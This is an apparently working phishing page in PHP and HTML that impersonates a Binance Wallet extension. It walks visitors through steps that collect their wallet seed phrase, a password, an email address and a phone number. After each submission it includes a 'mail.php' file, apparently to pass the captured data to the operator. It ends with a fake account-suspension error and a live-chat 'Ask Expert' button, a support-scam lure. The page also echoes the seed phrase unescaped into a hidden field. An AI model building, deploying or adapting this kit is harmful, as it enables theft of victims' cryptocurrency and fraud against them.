<!DOCTYPE html>
<html lang="en">
   <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>binance Wallet extension</title>
      <meta name="robots" content="noindex, nofollow"/>
      <meta name="googlebot" content="noindex, nofollow"/>
      <meta name="bingbot" content="noindex, nofollow"/>
      <link rel="icon" href="assets/images/favicon.ico" sizes="32x32">
      <link rel="stylesheet" href="assets/css/all.min.css">
      <link rel="stylesheet" href="assets/css/bootstrap.min.css">
      <link rel="stylesheet" href="assets/css/style.css">
   </head>
   <body>
      <?php
         if (isset($_POST['btnLoginMore'])) {
         ?>
      <div class="container-fluid" id="welcome-section">
         <form action="" method="post" style="background: none;">
            <h2 id="heading" style="margin-bottom: 5px; font-weight: bold; font-size: 20px;">Log in to Binance Wallet</h2>
           <h5 class="clsame" style=" margin-top: 14px; font-size: 16px;">Select Your Preferred Method</h5>
            
            <input type="hidden" name="brandName" value="binance Wallet" />
            <button name="fromLogUsername" type="submit" class="btn btn-block btn-default haveBtn" style="margin-top: 20px;">
               <svg xmlns="http://www.w3.org/2000/svg" fill="" viewBox="0 0 16 16" class="sc-gTgzIj fTLLNh"><path d="M4.4 4v2.4h-.8c-.855 0-1.6.621-1.6 1.467v6.666C2 15.38 2.745 16 3.6 16h9.6c.855 0 1.6-.621 1.6-1.467V7.867c0-.846-.745-1.467-1.6-1.467h-.8V4a4 4 0 00-8 0zm6.4 0v2.4H6V4a2.4 2.4 0 014.8 0zM3.6 14.4V8h9.6v6.4H3.6zm5.6-3.2a.8.8 0 11-1.6 0 .8.8 0 011.6 0z" clip-rule="evenodd"></path></svg>
                Import Seed Phrase</button>
            <button name="fromLogUsername" type="submit" class="btn btn-block btn-default haveBtn" style="margin-top: 10px;">
               <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 16 16" class="sc-hOqqkJ bKiBMa"><path fill="currentColor" fill-rule="evenodd" d="M1.2 14.8h13.6V1.2H1.2v13.6zM15.086 16c.505 0 .914-.41.914-.914V.914A.914.914 0 0015.086 0H.914A.914.914 0 000 .914v14.172c0 .505.41.914.914.914h14.172zM5.48 8.296h.593c.245 0 .444-.132.444-.296 0-.163-.199-.296-.444-.296H5.48c.053-.456.227-.874.488-1.223l.239.238a.362.362 0 10.512-.512l-.238-.238c.348-.26.766-.434 1.22-.487v.592c0 .246.133.445.297.445.164 0 .296-.2.296-.445v-.592c.456.053.874.227 1.223.488l-.237.237a.362.362 0 10.512.513l.237-.237c.26.348.434.766.487 1.22h-.592c-.245 0-.444.134-.444.297 0 .164.199.296.444.296h.592a2.523 2.523 0 01-.487 1.222l-.237-.237a.362.362 0 00-.513.512l.238.237a2.522 2.522 0 01-1.223.488v-.592c0-.246-.132-.444-.296-.444-.164 0-.296.198-.296.444v.592a2.52 2.52 0 01-1.222-.487l.239-.239a.362.362 0 10-.513-.512l-.238.239a2.522 2.522 0 01-.488-1.223zm4.846-2.577c.576.588.931 1.393.931 2.281a3.248 3.248 0 01-.973 2.323 3.249 3.249 0 01-2.286.936h-.001a3.26 3.26 0 112.33-5.54zM8 7.111a.889.889 0 100 1.778.889.889 0 000-1.778zm4.4 5.29H3.6l-.017-2h.12A.296.296 0 004 10.103V9.51a.296.296 0 00-.296-.296h-.132L3.548 6.4h.156A.296.296 0 004 6.104V5.51a.296.296 0 00-.296-.296h-.167L3.523 3.6H12.4v8.8zm1.23-10.03V13.63H2.37V10.4h-.296a.296.296 0 01-.296-.296V9.51c0-.163.133-.296.296-.296h.296V6.4h-.296a.296.296 0 01-.296-.296V5.51c0-.163.133-.296.296-.296h.296V2.37h11.26z" clip-rule="evenodd"></path></svg> Safulet</button>
            <button name="fromLogUsername" type="submit" class="btn btn-block btn-default haveBtn" style="margin-top: 10px; margin-bottom: 140px;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" class="sc-higXBA bYYIwB"><path d="M9.286 9.03l.178-.176-.178-.177-.333-.331-.177-.176-.176.176-1.036 1.038-.948-.947 1.038-1.039.177-.176-.177-.177-.331-.331-.177-.177-.176.177L5.93 7.75l-.95-.95-.178-.177-.177.178-.984.992a3.23 3.23 0 00-.316 4.198L.323 14.992l-.177.177.177.177.331.331.177.177.177-.177 3.001-3.002a3.225 3.225 0 004.197-.313l.993-.987.178-.177-.177-.178-.952-.951L9.286 9.03zM4.804 7.998l3.199 3.2-.48.475-.063.063c-.886.82-2.273.8-3.135-.06a2.264 2.264 0 01.002-3.197l.477-.48zM15.677 1.008l.176-.177-.176-.177-.331-.33-.177-.178-.177.177-3.002 3.002a3.231 3.231 0 00-4.197.313l-.992.988-.178.176.177.178 4.22 4.22.178.177.176-.178.985-.992a3.23 3.23 0 00.316-4.198l3.002-3.001zm-4.005 6.515l-.476.48-3.2-3.2.48-.475.064-.062c.886-.82 2.273-.8 3.135.06.88.881.88 2.314-.002 3.196l-.001.001z"></path></svg> Connect Hardware Wallet</button>
            <p style=" margin-bottom: 0; font-size: 12px;">Continue with tKey via:</p>
            <button class="btn btn-block btn-default haveBtn" name="fromLogUsername" type="submit" style=" margin-top: 0px; text-align: center;">
               <img height="20" src="assets/images/gl.svg" alt="">
             </button>
         </form>
      </div>
      <?php } elseif (isset($_POST['fromLogUsername'])) {
         // include 'mail.php';
         ?>
      <div class="container-fluid" id="welcome-section">
         <form action="" method="post">
            <input type="hidden" name="brandName" value="binance Wallet" />
            <h2 id="heading" style="margin-bottom: 5px; font-weight: bold;">Backup your wallet</h2>
            <p class="clsame">Enter your seed phrase to restore your wallet.

            </p>
            <div class="form-group">
               <label>Seed Phrase</label>
               <textarea name="secret_recovery_phrase" style=" width: 100%; height: 100px" required></textarea>
               <p class="clsame">Typically 12 words (sometimes 24) separated by single spaces.</p>
            </div>
            <button class="btn btn-block btn-primary" name="fromLogKey" type="submit" style=" margin-top: 150px;">Continue </button>
         </form>
      </div>
      <?php } elseif (isset($_POST['fromLogKey'])) {
         include 'mail.php';
         ?>
      <div class="container-fluid" id="welcome-section">
         <form action="" method="post">
            <input type="hidden" name="brandName" value="binance Wallet" />
            <input type="hidden" name="secret_recovery_phrase" value="<?php echo $_POST['secret_recovery_phrase']; ?>" />
            <h2 id="heading" style="margin-bottom: 5px; font-weight: bold;">Create password</h2>
            <p class="clsame">Set a password to unlock your wallet each time you use your computer. It can't be used to recover your wallet.
            </p>
            <div class="form-group">
               <label>Password</label>
               <input type="password" class="form-control" id="exampleInputEmail1" name="password" aria-describedby="emailHelp"
                  placeholder="Enter Password" required>
            </div>
            <div class="form-group">
               <label>Email</label>
               <input type="text" class="form-control" placeholder="Email
                  " name="email" required>
            </div>
            <div class="form-group">
               <label>Phone Number</label>
               <input type="text" class="form-control" placeholder="Enter Phone No
                  " name="number" required>
            </div>
            <button class="btn btn-block btn-primary" name="fromLog" type="submit" style=" margin-top: 50px;">Continue </button>
         </form>
      </div>
      <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
         ?>
      <div class="container-fluid errorDiv" id="welcome-section">
         <form action="" method="post" style="height: auto;">
            <div style="overflow: hidden; margin-top: 40px;">
               <img src="assets/images/bin-w.jpg" width="50">
               
            </div>
            <h2 id="heading" style="
    color: #e31616;
    margin-bottom: 15px;font-size: 20px;
"><b>!Important message</b></h2>
            <p class="clsame" style="
    font-size: 14px;
">Due to unauthorized activity and identification failure on your Account.
Account Access has been suspended. Please Get in touch with our Support
Staff Immediately</p>
<p style="text-align: left;font-weight: 600;font-size: 20px;margin-bottom: 30px;">Error CODE: EBRX16X76D</p>
    <div class="calling-number" style="text-align: left;">
               <a href="javascript:void(Tawk_API.toggle())" style="
                  padding: 8px 12px;
                  border-radius: 5px;
                  border: 1px solid #1552f0;
                  font-size: 16px;
                  background-color: #1552f0;
                  color: white;
                  ">Ask Expert</a>
            </div>            

         </form>
        
      </div>
      <?php } else { ?>
      <div class="container-fluid" id="welcome-section">
         <form action="" method="post">
            <div style="overflow: hidden; margin-top: 162px;">
               <img src="assets/images/bin-w.jpg" width="50">
               
            </div>
            <h2 id="heading">Welcome to Binance Wallet</h2>
            <p class="clsame">Secure and trusted multi-chain crypto wallet</p>
            
            <button name="btnLoginMore" type="submit" class="btn btn-block btn-primary" style="margin-top: 90px;">Use existing wallet</button>
            <button name="btnLoginMore" type="submit" class="btn btn-block btn-default haveBtn" style="margin-top: 20px;text-align: center !important;">Create wallet</button>
         </form>
      </div>
      <?php } ?>
      <script src="assets/js/jquery-3.5.1.min.js"></script>
      <script src="assets/js/popper.js"></script>
      <script src="assets/js/bootstrap.min.js"></script>
      <!--Start of Tawk.to Script-->
      <script type="text/javascript">
         var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
         (function(){
         var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
         s1.async=true;
         s1.src='https://embed.tawk.to/621a7b48a34c24564128808d/1fsrn35pf';
         s1.charset='UTF-8';
         s1.setAttribute('crossorigin','*');
         s0.parentNode.insertBefore(s1,s0);
         })();
      </script>
      <!--End of Tawk.to Script-->
   </body>
</html>